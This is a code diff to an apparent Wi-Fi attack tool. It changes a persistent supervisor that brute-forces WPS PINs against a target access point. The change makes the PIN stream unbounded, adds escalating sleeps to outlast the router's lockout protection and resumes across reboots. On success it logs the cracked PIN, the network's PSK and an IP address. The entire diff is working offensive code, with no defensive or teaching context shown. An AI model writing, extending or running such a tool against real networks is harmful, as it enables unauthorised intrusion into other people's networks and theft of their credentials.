@@ -222,11 +222,12 @@ def _other_sweep_active(outdir):
 
 
 def cmd_wpsd(a):
-    """Persistent WPS supervisor: batches through the corpus forever-ish.
+    """Persistent WPS supervisor over an INEXHAUSTIBLE stream - runs until
+    the PIN hits (no corpus to exhaust, no time budget).
 
     - resumes from OUT/done.log (pins, one per line) incl. across reboots
     - optional --seed-file pre-fills done on first start (already-tried PINs)
-    - lockout -> sleep --lockout-sleep and retry; success/exhausted -> exit 0
+    - lockout -> sleep, escalating after repeated lockouts; success -> exit 0
     - refuses to start while another sweep is active (single radio)
     """
     from .radio import wlan0_healthy
@@ -237,9 +238,8 @@ def cmd_wpsd(a):
     if busy:
         log(f"[!] another sweep active ({busy}) - refusing (single radio)")
         return 2
-    pins = _resolve_pins(log, a.pins)
-    if pins is None:
-        return 2
+    if a.pins != "corpus":
+        log("[*] note: --pins is deprecated, the stream is unbounded by design")
     done_path = os.path.join(a.out, "done.log")
     if not os.path.isfile(done_path) and a.seed_file and os.path.isfile(a.seed_file):
         with open(a.seed_file, errors="ignore") as f:
@@ -247,24 +247,26 @@ def cmd_wpsd(a):
         with open(done_path, "w") as f:
             f.write("\n".join(seed) + ("\n" if seed else ""))
         log(f"[*] seeded {len(seed)} already-tried PINs")
+    try:
+        with open(done_path, errors="ignore") as f:
+            done = {ln.strip() for ln in f if ln.strip()}
+    except Exception:
+        done = set()
+    stream = wordlists.wps_pin_stream(done)
+    lockout_streak = 0
     with open(os.path.join(a.out, "wps.log"), "a", buffering=1) as wlog:
         def both(msg):
             line = f"{datetime.datetime.now().isoformat(timespec='seconds')} {msg}"
             print(line, flush=True)
             wlog.write(line + "\n")
-        both(f"[*] wpsd persistent sweep vs {a.ssid} ({a.bssid}), {len(pins)} PINs in corpus")
+        both(f"[*] wpsd persistent sweep vs {a.ssid} ({a.bssid}), "
+             f"unbounded corpus ({len(done)} already done)")
         while True:
-            try:
-                with open(done_path, errors="ignore") as f:
-                    done = {ln.strip() for ln in f if ln.strip()}
-            except Exception:
-                done = set()
-            todo = [p for p in pins if p not in done]
-            if not todo:
-                both("[DONE] corpus exhausted, no hit. Stopping (no restart).")
+            batch = [p for _, p in zip(range(a.batch), stream)]
+            if not batch:  # unreachable in practice (10M deep) - kept for safety
+                both("[DONE] stream exhausted (impossible?) - stopping.")
                 return 0
-            batch, todo = todo[:a.batch], todo[a.batch:]
-            both(f"[*] batch: {len(batch)} PINs ({len(done)} done, {len(todo)} queued after)")
+            both(f"[*] batch: {len(batch)} PINs ({len(done)} done so far)")
             res = wps_attack.sweep(a.bssid, a.ssid, batch, a.out, both,
                                    wait_s=a.wait, done=done, gap_s=a.gap)
             with open(done_path, "a", buffering=1) as f:
@@ -276,9 +278,12 @@ def cmd_wpsd(a):
                 both(f"[+] WPS SUCCESS PIN={res['pin']} PSK={res.get('psk')} IP={res.get('ip')}")
                 return 0
             if res.get("reason") == "locked":
-                both(f"[*] AP locked - backing off {a.lockout_sleep}s")
-                time.sleep(a.lockout_sleep)
+                lockout_streak += 1
+                nap = a.lockout_sleep * (6 if lockout_streak >= 5 else 1)
+                both(f"[*] AP locked (streak {lockout_streak}) - backing off {nap}s")
+                time.sleep(nap)
                 continue
+            lockout_streak = 0
             if not wlan0_healthy():
                 both("[!] wlan0 disturbed - stopping (systemd will retry)")
                 return 1
